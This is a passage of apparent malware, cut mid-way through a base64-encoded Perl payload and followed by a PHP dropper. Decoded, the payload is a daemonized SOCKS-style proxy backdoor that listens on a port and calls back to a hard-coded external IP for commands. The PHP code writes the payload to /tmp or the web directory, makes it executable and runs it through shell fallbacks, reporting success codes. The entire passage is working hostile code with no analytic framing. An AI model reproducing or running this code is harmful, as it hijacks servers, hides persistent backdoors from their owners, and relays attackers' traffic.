ci1BZ2VudDogTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOyBXaW5kb3dzIE5UIDUu
MSkiLCAiSG9zdDogJGhvc3QiLCAiQ29ubmVjdGlvbjogY2xvc2UiLCAiQ2FjaGUtQ29udHJvbDog
bm8tY2FjaGUiLCAiXHgwRFx4MEEiKTsKfQp9Cn0KJHNlc3Npb24tPnskX317dGltZW91dH0gKz0g
dGltZSBmb3JlYWNoIChrZXlzICUkc2Vzc2lvbik7CndoaWxlICgkcmVhZGVycy0+Y291bnQoKSB8
fCAkd3JpdGVycy0+Y291bnQoKSkKewpteSAkdGltZSA9IHRpbWU7Cm15ICR3cml0YWJsZSA9IChJ
Tzo6U2VsZWN0LT5zZWxlY3QodW5kZWYsICR3cml0ZXJzLCB1bmRlZiwgMCkpWzFdOwpmb3JlYWNo
IG15ICRoYW5kbGUgKEAkd3JpdGFibGUpCnsKaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVz
fSBlcSAiY24iKQp7CmlmICgkaGFuZGxlLT5jb25uZWN0ZWQpCnsKaWYgKCRzZXNzaW9uLT57JGhh
bmRsZX17cmVzdWx0fSBlcSAidGNwMjUiKQp7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9
ICJyZCI7CiRyZWFkZXJzLT5hZGQoJGhhbmRsZSk7CiR3cml0ZXJzLT5yZW1vdmUoJGhhbmRsZSk7
Cn0KZWxzZQp7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9ICJ3ciI7Cn0KfQplbHNlCnsK
JHNlc3Npb24tPnskaGFuZGxlfXt0aW1lb3V0fSA9IDA7Cn0KfQplbHNlCnsKbXkgJHJlc3VsdDsK
aWYgKCRzZXNzaW9uLT57JGhhbmRsZX17cmVzdWx0fSBlcSAidWRwNTMiKQp7CiRyZXN1bHQgPSAk
aGFuZGxlLT5zZW5kKCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMCwgJHNlc3Npb24tPnsk
aGFuZGxlfXthZGRyfSk7Cn0KZWxzaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17cmVzdWx0fSBlcSAi
dGNwNTMiKQp7CiRyZXN1bHQgPSAkaGFuZGxlLT5zZW5kKCRzZXNzaW9uLT57JGhhbmRsZX17YnVm
ZmVyfSk7Cn0KZWxzZQp7CiRyZXN1bHQgPSBzeXN3cml0ZSAoJGhhbmRsZSwgJHNlc3Npb24tPnsk
aGFuZGxlfXtidWZmZXJ9KTsKfQppZiAoZGVmaW5lZCAkcmVzdWx0ICYmICRyZXN1bHQgPiAwKQp7
CnN1YnN0ciAoJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9LCAwLCAkcmVzdWx0KSA9ICIiOwpp
ZiAobGVuZ3RoICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSA8IDEpCnsKJHNlc3Npb24tPnsk
aGFuZGxlfXtzdGF0dXN9ID0gInJkIjsKJHJlYWRlcnMtPmFkZCgkaGFuZGxlKTsKJHdyaXRlcnMt
PnJlbW92ZSgkaGFuZGxlKTsKfQp9CmVsc2lmICgkISA9PSAkZXdibG9jaykKewpuZXh0Owp9CmVs
c2UKewokc2Vzc2lvbi0+eyRoYW5kbGV9e3RpbWVvdXR9ID0gMDsKfQp9Cn0KbXkgJHJlYWRhYmxl
ID0gKElPOjpTZWxlY3QtPnNlbGVjdCgkcmVhZGVycywgdW5kZWYsIHVuZGVmLCAwKSlbMF07CmZv
cmVhY2ggbXkgJGhhbmRsZSAoQCRyZWFkYWJsZSkKewpteSAkcmVzdWx0OwppZiAoJHNlc3Npb24t
PnskaGFuZGxlfXtyZXN1bHR9IGVxICJ1ZHA1MyIpCnsKJHJlc3VsdCA9ICRoYW5kbGUtPnJlY3Yo
JHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9LCA1MTIpOwokcmVzdWx0ID0gbGVuZ3RoICRzZXNz
aW9uLT57JGhhbmRsZX17YnVmZmVyfSBpZiBkZWZpbmVkICRyZXN1bHQ7Cn0KZWxzaWYgKCRzZXNz
aW9uLT57JGhhbmRsZX17cmVzdWx0fSBlcSAidGNwNTMiKQp7CiRyZXN1bHQgPSAkaGFuZGxlLT5y
ZWN2KCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMik7CiRyZXN1bHQgPSBsZW5ndGggJHNl
c3Npb24tPnskaGFuZGxlfXtidWZmZXJ9IGlmIGRlZmluZWQgJHJlc3VsdDsKfQplbHNlCnsKJHJl
c3VsdCA9IHN5c3JlYWQgKCRoYW5kbGUsICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgODE5
MiwgbGVuZ3RoICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSk7Cn0KaWYgKGRlZmluZWQgJHJl
c3VsdCkKewppZiAoJHNlc3Npb24tPnskaGFuZGxlfXtyZXN1bHR9IGVxICJpcCIpCnsKaWYgKCR0
ZXN0LT57JHNlc3Npb24tPnskaGFuZGxlfXtyZXN1bHR9fVswXSBlcSAiMC4wLjAuMCIpCnsKaWYg
KCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSA9fiAvKFxkK1wuXGQrXC5cZCtcLlxkKykvKQp7
CiR0ZXN0LT57JHNlc3Npb24tPnskaGFuZGxlfXtyZXN1bHR9fVswXSA9ICQxOwokc2Vzc2lvbi0+
eyRoYW5kbGV9e3RpbWVvdXR9ID0gMDsKfQplbHNlCnsKbmV4dDsKfQp9CmVsc2UKewokc2Vzc2lv
bi0+eyRoYW5kbGV9e3RpbWVvdXR9ID0gMDsKfQp9CmVsc2UKewokdGVzdC0+eyRzZXNzaW9uLT57
JGhhbmRsZX17cmVzdWx0fX1bMF0gPSAxIGlmICRyZXN1bHQgPiAwOwokc2Vzc2lvbi0+eyRoYW5k
bGV9e3RpbWVvdXR9ID0gMDsKfQp9CmVsc2lmICgkISA9PSAkZXdibG9jaykKewpuZXh0Owp9CmVs
c2UKewokc2Vzc2lvbi0+eyRoYW5kbGV9e3RpbWVvdXR9ID0gMDsKfQp9CmZvcmVhY2ggbXkgJGhh
bmRsZSAoJHdyaXRlcnMtPmhhbmRsZXMsICRyZWFkZXJzLT5oYW5kbGVzKQp7CmlmICgkdGltZSA+
PSAkc2Vzc2lvbi0+eyRoYW5kbGV9e3RpbWVvdXR9KQp7CiRyZWFkZXJzLT5yZW1vdmUoJGhhbmRs
ZSkgaWYgJHJlYWRlcnMtPmV4aXN0cygkaGFuZGxlKTsKJHdyaXRlcnMtPnJlbW92ZSgkaGFuZGxl
KSBpZiAkd3JpdGVycy0+ZXhpc3RzKCRoYW5kbGUpOwpkZWxldGUgJHNlc3Npb24tPnskaGFuZGxl
fTsKY2xvc2UgJGhhbmRsZTsKfQp9Cn0KbGFzdDsKfQp9CnN1YiBzdGFydHNlcnZlcgp7CmlmICgk
Xk8gbmUgIk1TV2luMzIiKQp7CnVzZSBQT1NJWCBxdyhzZXRzaWQpOwpyZXR1cm4gdW5sZXNzIGRl
ZmluZWQgKG15ICRjaGlsZCA9IGZvcmspOwpyZXR1cm4gaWYgJGNoaWxkOwpQT1NJWDo6c2V0c2lk
KCk7CiRTSUd7Q0hMRH0gPSBzdWIgeyB3aGlsZSAod2FpdHBpZCAoLTEsIDEpID4gMCkge30gfTsK
JFNJR3skX30gPSAiSUdOT1JFIiBmb3IgKHF3IChIVVAgSU5UIElMTCBGUEUgUVVJVCBBQlJUIFVT
UjEgU0VHViBVU1IyIFBJUEUgQUxSTSBURVJNKSk7CnVtYXNrIDA7CmNoZGlyICIvIjsKb3BlbiAo
U1RESU4sICI8L2Rldi9udWxsIik7Cm9wZW4gKFNURE9VVCwgIj4vZGV2L251bGwiKTsKb3BlbiAo
U1RERVJSLCAiPiZTVERPVVQiKTsKfQpteSAkc2V0dGluZyA9IHsgbGlzdGVuX3BvcnQgPT4gMzM3
NzgsIHJlbW90ZV9ob3N0X2xpc3QgPT4gWyI3Ny43Mi44My44MzozNzgyNyJdLCBhbGxvd19ob3N0
X2xpc3QgPT4ge30sIHJlc3RhcnRfdGltZXIgPT4gNSwgY29ubmVjdF90aW1lb3V0ID0+IDEwLCBz
ZXNzaW9uX3RpbWVvdXQgPT4gNjAgfTsKbXkgJHJlYWRlcnMgPSBJTzo6U2VsZWN0LT5uZXcoKSBv
ciBleGl0IDA7Cm15ICR3cml0ZXJzID0gSU86OlNlbGVjdC0+bmV3KCkgb3IgZXhpdCAwOwpteSAk
c2Vzc2lvbiA9IHt9OwpteSAkZGVzdHJveSA9IHN1Ygp7Cm15ICRoYW5kbGUgPSBzaGlmdDsKaWYg
KGV4aXN0cyAkc2Vzc2lvbi0+eyRoYW5kbGV9KQp7CiRyZWFkZXJzLT5yZW1vdmUoJHNlc3Npb24t
PnskaGFuZGxlfXtoYW5kbGV9KSBpZiAkcmVhZGVycy0+ZXhpc3RzKCRzZXNzaW9uLT57JGhhbmRs
ZX17aGFuZGxlfSk7CiR3cml0ZXJzLT5yZW1vdmUoJHNlc3Npb24tPnskaGFuZGxlfXtoYW5kbGV9
KSBpZiAkd3JpdGVycy0+ZXhpc3RzKCRzZXNzaW9uLT57JGhhbmRsZX17aGFuZGxlfSk7CmNsb3Nl
ICRzZXNzaW9uLT57JGhhbmRsZX17aGFuZGxlfTsKZGVsZXRlICRzZXNzaW9uLT57JGhhbmRsZX07
Cn0KfTsKbXkgJGxpc3Rlbl9zb2NrZXQgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG8gPT4g
InRjcCIsIExvY2FsUG9ydCA9PiAkc2V0dGluZy0+e2xpc3Rlbl9wb3J0fSwgTGlzdGVuID0+IFNP
TUFYQ09OTiwgUmV1c2UgPT4gMSk7CmV4aXQgMCB1bmxlc3MgJGxpc3Rlbl9zb2NrZXQ7CmlmICgk
Xk8gZXEgIk1TV2luMzIiKSB7IGlvY3RsICgkbGlzdGVuX3NvY2tldCwgMHg4MDA0NjY3ZSwgcGFj
ayAoIkwiLCAxKSk7IH0gZWxzZSB7ICRsaXN0ZW5fc29ja2V0LT5ibG9ja2luZygwKTsgfQp1bmxl
c3MgKCRyZWFkZXJzLT5hZGQoJGxpc3Rlbl9zb2NrZXQpKQp7CmNsb3NlICRsaXN0ZW5fc29ja2V0
OwpleGl0IDA7Cn0KZm9yZWFjaCAoQHskc2V0dGluZy0+e3JlbW90ZV9ob3N0X2xpc3R9fSkKewpt
eSAoJGhvc3RhZGRyLCAkaG9zdHBvcnQpID0gc3BsaXQgKC86LywgJF8sIDIpOwokaG9zdGFkZHIg
PSBwYWNrICgiQzQiLCBzcGxpdCAoL1wuLywgJGhvc3RhZGRyKSk7CmlmICgkaG9zdGFkZHIpCnsK
JHNldHRpbmctPnthbGxvd19ob3N0X2xpc3R9eyRob3N0YWRkcn0gPSAiIjsKbXkgJHNvY2tldCA9
IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAidGNwIiwgVHlwZSA9PiBTT0NLX1NUUkVB
TSk7Cm5leHQgdW5sZXNzICRzb2NrZXQ7CmlmICgkXk8gZXEgIk1TV2luMzIiKSB7IGlvY3RsICgk
c29ja2V0LCAweDgwMDQ2NjdlLCBwYWNrICgiTCIsIDEpKTsgfSBlbHNlIHsgJHNvY2tldC0+Ymxv
Y2tpbmcoMCk7IH0KdW5sZXNzICgkc29ja2V0LT5jb25uZWN0KCRfID0gc29ja2FkZHJfaW4oJGhv
c3Rwb3J0LCAkaG9zdGFkZHIpKSkKewppZiAoJCEgIT0gJGVpcHJvZ3IgJiYgJCEgIT0gJGV3Ymxv
Y2spCnsKY2xvc2UgJHNvY2tldDsKbmV4dDsKfQp9CnVubGVzcyAoJHdyaXRlcnMtPmFkZCgkc29j
a2V0KSkKewpjbG9zZSAkc29ja2V0OwpuZXh0Owp9CnVubGVzcyAoJHJlYWRlcnMtPmFkZCgkc29j
a2V0KSkKewokd3JpdGVycy0+cmVtb3ZlKCRzb2NrZXQpOwpjbG9zZSAkc29ja2V0OwpuZXh0Owp9
CiRzZXNzaW9uLT57JHNvY2tldH0gPQp7CnN0YXR1cwk9PiAiY25fcmgiLApidWZmZXIJPT4gIiIs
CmhhbmRsZQk9PiAkc29ja2V0LAp0YXJnZXQJPT4gIiIsCmZsYWdzZXQJPT4gMSwKdGltZW91dAk9
PiAwCn07Cn0KfQokc2V0dGluZy0+e3Jlc3RhcnRfdGltZXJ9ID0gdGltZSAtIDEwICsgJHNldHRp
bmctPntyZXN0YXJ0X3RpbWVyfSAqIDYwOwp3aGlsZSAoMSkKewpJTzo6U2VsZWN0LT5zZWxlY3Qo
dW5kZWYsIHVuZGVmLCB1bmRlZiwgMC4wMSk7Cm15ICRyZWFkYWJsZSA9IChJTzo6U2VsZWN0LT5z
ZWxlY3QoJHJlYWRlcnMsIHVuZGVmLCB1bmRlZiwgMC4wMSkpWzBdOwpmb3JlYWNoIG15ICRoYW5k
bGUgKEAkcmVhZGFibGUpCnsKaWYgKCRoYW5kbGUgZXEgJGxpc3Rlbl9zb2NrZXQpCnsKbXkgKCRz
b2NrZXRfb25lLCAkcGVlcl9hZGRyKSA9ICRoYW5kbGUtPmFjY2VwdDsKbmV4dCB1bmxlc3MgJHNv
Y2tldF9vbmU7CiRwZWVyX2FkZHIgPSBzdWJzdHIgKCRwZWVyX2FkZHIsIDQsIDQpOwp1bmxlc3Mg
KGV4aXN0cyAkc2V0dGluZy0+e2FsbG93X2hvc3RfbGlzdH17JHBlZXJfYWRkcn0pCnsKY2xvc2Ug
JHNvY2tldF9vbmU7Cm5leHQ7Cn0KbXkgJHNvY2tldF90d28gPSBJTzo6U29ja2V0OjpJTkVULT5u
ZXcoUHJvdG8gPT4gInRjcCIsIFR5cGUgPT4gU09DS19TVFJFQU0pOwp1bmxlc3MgKCRzb2NrZXRf
dHdvKQp7CmNsb3NlICRzb2NrZXRfb25lOwpuZXh0Owp9CmlmICgkXk8gZXEgIk1TV2luMzIiKSB7
IGlvY3RsICgkc29ja2V0X29uZSwgMHg4MDA0NjY3ZSwgcGFjayAoIkwiLCAxKSk7IH0gZWxzZSB7
ICRzb2NrZXRfb25lLT5ibG9ja2luZygwKTsgfQppZiAoJF5PIGVxICJNU1dpbjMyIikgeyBpb2N0
bCAoJHNvY2tldF90d28sIDB4ODAwNDY2N2UsIHBhY2sgKCJMIiwgMSkpOyB9IGVsc2UgeyAkc29j
a2V0X3R3by0+YmxvY2tpbmcoMCk7IH0KaWYgKCRyZWFkZXJzLT5hZGQoJHNvY2tldF9vbmUpKQp7
CmlmICgkcmVhZGVycy0+YWRkKCRzb2NrZXRfdHdvKSkKewppZiAoJHdyaXRlcnMtPmFkZCgkc29j
a2V0X29uZSkpCnsKaWYgKCR3cml0ZXJzLT5hZGQoJHNvY2tldF90d28pKQp7CiRzZXNzaW9uLT57
JHNvY2tldF9vbmV9ID0KewpzdGF0dXMJPT4gInJkX3FyIiwKYnVmZmVyCT0+ICIiLApoYW5kbGUJ
PT4gJHNvY2tldF9vbmUsCnRhcmdldAk9PiAkc29ja2V0X3R3bywKZmxhZ3NldAk9PiAxLAp0aW1l
b3V0CT0+IDAKfTsKJHNlc3Npb24tPnskc29ja2V0X3R3b30gPQp7CnN0YXR1cwk9PiAid3RfY20i
LApidWZmZXIJPT4gIiIsCmhhbmRsZQk9PiAkc29ja2V0X3R3bywKdGFyZ2V0CT0+ICRzb2NrZXRf
b25lLApmbGFnc2V0CT0+IDEsCnRpbWVvdXQJPT4gMAp9OwpuZXh0Owp9CiR3cml0ZXJzLT5yZW1v
dmUoJHNvY2tldF9vbmUpOwp9CiRyZWFkZXJzLT5yZW1vdmUoJHNvY2tldF90d28pOwp9CiRyZWFk
ZXJzLT5yZW1vdmUoJHNvY2tldF9vbmUpOwp9CmNsb3NlICRzb2NrZXRfb25lOwpjbG9zZSAkc29j
a2V0X3R3bzsKbmV4dDsKfQpuZXh0IHVubGVzcyBleGlzdHMgJHNlc3Npb24tPnskaGFuZGxlfTsK
bmV4dCBpZiAkc2Vzc2lvbi0+eyRoYW5kbGV9e3N0YXR1c30gIX4gL14ocmR8dHIpLzsKbXkgJGJ1
ZmZlcjsKaWYgKCQxIGVxICJyZCIpCnsKJGJ1ZmZlciA9IFwkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1
ZmZlcn07Cn0KZWxzaWYgKGV4aXN0cyAkc2Vzc2lvbi0+eyRzZXNzaW9uLT57JGhhbmRsZX17dGFy
Z2V0fX0pCnsKJGJ1ZmZlciA9IFwkc2Vzc2lvbi0+eyRzZXNzaW9uLT57JGhhbmRsZX17dGFyZ2V0
fX17YnVmZmVyfTsKfQplbHNlCnsKJGRlc3Ryb3ktPigkaGFuZGxlKTsKbmV4dDsKfQpteSAkbGVu
Z3RoID0gbGVuZ3RoICQkYnVmZmVyOwpteSAkdW51c2VkID0gODE5MiAtICRsZW5ndGg7CmlmICgk
dW51c2VkID4gMCkKewpteSAkcmVzdWx0ID0gc3lzcmVhZCAoJGhhbmRsZSwgJCRidWZmZXIsICR1
bnVzZWQsICRsZW5ndGgpOwppZiAoZGVmaW5lZCAkcmVzdWx0KQp7CmlmICgkcmVzdWx0ID4gMCkK
ewokc2Vzc2lvbi0+eyRoYW5kbGV9e2ZsYWdzZXR9ID0gMTsKJGxlbmd0aCArPSAkcmVzdWx0Owp9
CmVsc2UKewppZiAoZXhpc3RzICRzZXNzaW9uLT57JHNlc3Npb24tPnskaGFuZGxlfXt0YXJnZXR9
fSkKewp1bmxlc3MgKGxlbmd0aCAkc2Vzc2lvbi0+eyRzZXNzaW9uLT57JGhhbmRsZX17dGFyZ2V0
fX17YnVmZmVyfSkKewokZGVzdHJveS0+KCRzZXNzaW9uLT57JGhhbmRsZX17dGFyZ2V0fSk7Cn0K
ZWxzZQp7CiRyZWFkZXJzLT5yZW1vdmUoJHNlc3Npb24tPnskaGFuZGxlfXt0YXJnZXR9KTsKfQp9
CiRkZXN0cm95LT4oJGhhbmRsZSk7Cm5leHQ7Cn0KfQplbHNpZiAoJCEgPT0gJGV3YmxvY2spCnsK
bmV4dDsKfQplbHNlCnsKJGRlc3Ryb3ktPigkc2Vzc2lvbi0+eyRoYW5kbGV9e3RhcmdldH0pOwok
ZGVzdHJveS0+KCRoYW5kbGUpOwpuZXh0Owp9Cn0KbmV4dCBpZiAkc2Vzc2lvbi0+eyRoYW5kbGV9
e3N0YXR1c30gZXEgInRyX2R0IjsKaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSBlcSAi
cmRfcXIiKQp7Cm5leHQgaWYgJGxlbmd0aCA8IDI7Cm15ICRzaWduYXR1cmUgPSBzdWJzdHIgJCRi
dWZmZXIsIDAsIDI7CmlmICgkc2lnbmF0dXJlIGVxICJceDcwXHgxMCIpCnsKJGRlc3Ryb3ktPigk
c2Vzc2lvbi0+eyRoYW5kbGV9e3RhcmdldH0pOwokc2Vzc2lvbi0+eyRoYW5kbGV9e3N0YXR1c30g
PSAicmRfcmgiOwp9CmVsc2lmICgkc2lnbmF0dXJlIGVxICJceDA0XHgwMSIpCnsKJHNlc3Npb24t
PnskaGFuZGxlfXtzdGF0dXN9ID0gInJkX2NsIjsKfQplbHNlCnsKJGRlc3Ryb3ktPigkc2Vzc2lv
bi0+eyRoYW5kbGV9e3RhcmdldH0pOwokZGVzdHJveS0+KCRoYW5kbGUpOwpuZXh0Owp9Cn0KaWYg
KCRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSBlcSAicmRfcmgiKQp7Cm5leHQgaWYgJGxlbmd0
aCA8IDIwOwppZiAodW5wYWNrICgiUyIsIChzdWJzdHIgJCRidWZmZXIsIDIsIDIpKSA9PSAxMjgp
CnsKJHNldHRpbmctPntyZXN0YXJ0X3RpbWVyfSA9IDA7Cn0KZWxzaWYgKChteSAkY291bnRlciA9
IHVucGFjayAoIlMiLCAoc3Vic3RyICQkYnVmZmVyLCAxOCwgMikpKSA+IDApCnsKbmV4dCBpZiAk
bGVuZ3RoIDwgKDIwICsgJGNvdW50ZXIgKiA0KTsKd2hpbGUgKG15ICRhbGxvd19ob3N0ID0gKHN1
YnN0ciAkJGJ1ZmZlciwgMjAsIDQsICIiKSkKewpsYXN0IGlmIChsZW5ndGggJGFsbG93X2hvc3Qp
IDwgNDsKJHNldHRpbmctPnthbGxvd19ob3N0X2xpc3R9eyRhbGxvd19ob3N0fSA9ICIiOwp9Cn0K
JGRlc3Ryb3ktPigkaGFuZGxlKTsKfQplbHNlCnsKbmV4dCBpZiAkbGVuZ3RoIDwgOTsKaWYgKCht
eSAkaW5kZXggPSBpbmRleCAkJGJ1ZmZlciwgIlx4MDAiLCA4KSA+IDApCnsKbXkgJHNvY2tldCA9
ICRzZXNzaW9uLT57JGhhbmRsZX17dGFyZ2V0fTsKdW5sZXNzICgkc29ja2V0LT5jb25uZWN0KCRf
ID0gc29ja2FkZHJfaW4odW5wYWNrICgibiIsIHN1YnN0ciAoJCRidWZmZXIsIDIsIDIpKSwgc3Vi
c3RyICgkJGJ1ZmZlciwgNCwgNCkpKSkKewppZiAoJCEgIT0gJGVpcHJvZ3IgJiYgJCEgIT0gJGV3
YmxvY2spCnsKJGRlc3Ryb3ktPigkc2Vzc2lvbi0+eyRoYW5kbGV9e3RhcmdldH0pOwokc2Vzc2lv
bi0+eyRoYW5kbGV9e3N0YXR1c30gPSAid3JfcmoiOwokJGJ1ZmZlciA9IHBhY2sgKCJTeDYiLCAy
MzI5Nik7Cm5leHQ7Cn0KfQokc2Vzc2lvbi0+eyRzZXNzaW9uLT57JGhhbmRsZX17dGFyZ2V0fX17
c3RhdHVzfSA9ICJjbl90aCI7CiRzZXNzaW9uLT57JHNlc3Npb24tPnskaGFuZGxlfXt0YXJnZXR9
fXtmbGFnc2V0fSA9IDE7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9ICJ3dF9jbSI7CnN1
YnN0ciAoJCRidWZmZXIsIDAsICRpbmRleCArIDEpID0gIiI7CiRzZXNzaW9uLT57JHNlc3Npb24t
PnskaGFuZGxlfXt0YXJnZXR9fXtidWZmZXJ9ID0gJCRidWZmZXI7CiQkYnVmZmVyID0gcGFjayAo
IlN4NiIsIDIzMDQwKTsKfQp9Cn0KSU86OlNlbGVjdC0+c2VsZWN0KHVuZGVmLCB1bmRlZiwgdW5k
ZWYsIDAuMDEpOwpteSAkd3JpdGFibGUgPSAoSU86OlNlbGVjdC0+c2VsZWN0KHVuZGVmLCAkd3Jp
dGVycywgdW5kZWYsIDAuMDEpKVsxXTsKZm9yZWFjaCBteSAkaGFuZGxlIChAJHdyaXRhYmxlKQp7
Cm5leHQgdW5sZXNzIGV4aXN0cyAkc2Vzc2lvbi0+eyRoYW5kbGV9OwpuZXh0IGlmICRzZXNzaW9u
LT57JGhhbmRsZX17c3RhdHVzfSAhfiAvXigoY258d3J8dHIpXyguKykpJC87CmlmICgkMiBlcSAi
Y24iKQp7CmlmICgkaGFuZGxlLT5jb25uZWN0ZWQpCnsKaWYgKCQzIGVxICJyaCIpCnsKJHNlc3Np
b24tPnskaGFuZGxlfXtmbGFnc2V0fSA9IDE7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9
ICJ3cl9yaCI7CiRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSA9IHBhY2sgKCJTbiIsIDU0ODks
ICRzZXR0aW5nLT57bGlzdGVuX3BvcnR9KTsKfQplbHNlCnsKJHNlc3Npb24tPnskc2Vzc2lvbi0+
eyRoYW5kbGV9e3RhcmdldH19e2ZsYWdzZXR9ID0gMTsKJHNlc3Npb24tPnskc2Vzc2lvbi0+eyRo
YW5kbGV9e3RhcmdldH19e3N0YXR1c30gPSAid3JfZ3IiOwokc2Vzc2lvbi0+eyRoYW5kbGV9e3N0
YXR1c30gPSAid3RfY20iOwp9Cn0KZWxzZQp7CmlmICgkMyBlcSAicmgiKQp7Cn0KZWxzZQp7CiRz
ZXNzaW9uLT57JHNlc3Npb24tPnskaGFuZGxlfXt0YXJnZXR9fXtmbGFnc2V0fSA9IDE7CiRzZXNz
aW9uLT57JHNlc3Npb24tPnskaGFuZGxlfXt0YXJnZXR9fXtzdGF0dXN9ID0gIndyX3JqIjsKJHNl
c3Npb24tPnskc2Vzc2lvbi0+eyRoYW5kbGV9e3RhcmdldH19e2J1ZmZlcn0gPSBwYWNrICgiU3g2
IiwgMjMyOTYpOwp9CiRkZXN0cm95LT4oJGhhbmRsZSk7Cn0KbmV4dDsKfQppZiAobGVuZ3RoICRz
ZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSkKewpteSAkcmVzdWx0ID0gc3lzd3JpdGUgKCRoYW5k
bGUsICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSk7CmlmIChkZWZpbmVkICRyZXN1bHQgJiYg
JHJlc3VsdCA+IDApCnsKJHNlc3Npb24tPnskaGFuZGxlfXtmbGFnc2V0fSA9IDE7CnN1YnN0ciAo
JHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9LCAwLCAkcmVzdWx0KSA9ICIiOwp1bmxlc3MgKGxl
bmd0aCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0pCnsKaWYgKCQxIGVxICJ3cl9yaCIpCnsK
JHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9ID0gInJkX3JoIjsKfQplbHNpZiAoJDEgZXEgIndy
X3JqIikKewokZGVzdHJveS0+KCRoYW5kbGUpOwp9CmVsc2lmICgkMSBlcSAid3JfZ3IiKQp7CiRz
ZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9ICJ0cl9kdCI7CiRzZXNzaW9uLT57JHNlc3Npb24t
PnskaGFuZGxlfXt0YXJnZXR9fXtzdGF0dXN9ID0gInRyX2R0IjsKfQplbHNpZiAoJDEgZXEgInRy
X2R0IikKewp1bmxlc3MgKGV4aXN0cyAkc2Vzc2lvbi0+eyRzZXNzaW9uLT57JGhhbmRsZX17dGFy
Z2V0fX0pCnsKJGRlc3Ryb3ktPigkaGFuZGxlKTsKfQp9Cn0KfQplbHNpZiAoJCEgPT0gJGV3Ymxv
Y2spCnsKbmV4dDsKfQplbHNlCnsKJGRlc3Ryb3ktPigkc2Vzc2lvbi0+eyRoYW5kbGV9e3Rhcmdl
dH0pOwokZGVzdHJveS0+KCRoYW5kbGUpOwp9Cn0KfQp3aGlsZSAobXkgKCRoYW5kbGUsICR2YWx1
ZXMpID0gZWFjaCAlJHNlc3Npb24pCnsKbmV4dCBpZiAkdmFsdWVzLT57c3RhdHVzfSBlcSAid3Rf
Y20iOwpteSAkdGltZW91dCA9IHRpbWU7CmlmICgkdmFsdWVzLT57ZmxhZ3NldH0pCnsKaWYgKCR2
YWx1ZXMtPntzdGF0dXN9ID1+IC9eY24vKQp7CiR0aW1lb3V0ICs9ICRzZXR0aW5nLT57Y29ubmVj
dF90aW1lb3V0fTsKfQplbHNlCnsKJHRpbWVvdXQgKz0gJHNldHRpbmctPntzZXNzaW9uX3RpbWVv
dXR9Owp9CmlmIChleGlzdHMgJHNlc3Npb24tPnskdmFsdWVzLT57dGFyZ2V0fX0pCnsKJHNlc3Np
b24tPnskdmFsdWVzLT57dGFyZ2V0fX17dGltZW91dH0gPSAkdGltZW91dDskc2Vzc2lvbi0+eyR2
YWx1ZXMtPnt0YXJnZXR9fXtmbGFnc2V0fSA9IDA7Cn0KJHZhbHVlcy0+e3RpbWVvdXR9ID0gJHRp
bWVvdXQ7CiR2YWx1ZXMtPntmbGFnc2V0fSA9IDA7Cn0KZWxzaWYgKCR0aW1lb3V0ID49ICR2YWx1
ZXMtPnt0aW1lb3V0fSkKewokZGVzdHJveS0+KCRzZXNzaW9uLT57JGhhbmRsZX17dGFyZ2V0fSk7
JGRlc3Ryb3ktPigkaGFuZGxlKTsKfQp9CmlmICgkcmVhZGVycy0+ZXhpc3RzKCRsaXN0ZW5fc29j
a2V0KSAmJiB0aW1lID49ICRzZXR0aW5nLT57cmVzdGFydF90aW1lcn0pCnsKJHJlYWRlcnMtPnJl
bW92ZSgkbGlzdGVuX3NvY2tldCk7Y2xvc2UgJGxpc3Rlbl9zb2NrZXQ7CiZzdGFydHNlcnZlcigp
IGlmICRzZXR0aW5nLT57cmVzdGFydF90aW1lcn07fQpsYXN0IHVubGVzcyAkcmVhZGVycy0+Y291
bnQgb3IgJHdyaXRlcnMtPmNvdW50O30KZXhpdCAwO30=");
$o="ht7d";$g="g0ud$o";$b="b3ds$o";$e="Jm7"."3uZ";
if(strtolower(substr(PHP_OS,0,3))=="win"){echo "$b=windows=";exit;}
$r=0;$o=fn_procopen("/usr/bin/perl",$s);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_procopen("perl",$s);if(preg_match("/$e/",$o))$r=1;
if($r){echo "$g=$e=";exit;}
$t='';$a='';$d=array(".","/tmp","/var/tmp");
foreach($d as $p)
{
if(is_dir($p) && is_writable($p))
{
$t="$p/$n";
if($p==".")
{
$a="$p/.htaccess";
$u.=$n;
}
break;
}
}
if(!strlen($t)){echo "$b=folder=";exit;}
@unlink($t);$r=0;$h=fopen($t,"w");if($h){$r=fwrite($h,$s);fclose($h);}
if(!$r){echo "$b=save=";exit;}
@chmod($t,0755);
$i1="chmod +x $t && /usr/bin/perl $t";
$i2="chmod +x $t && perl $t";
$r=0;
if(!$r)$o=fn_system($i1);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_system($i2);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_exec($i1);if(preg_match("/$e/",$o))$r=1;
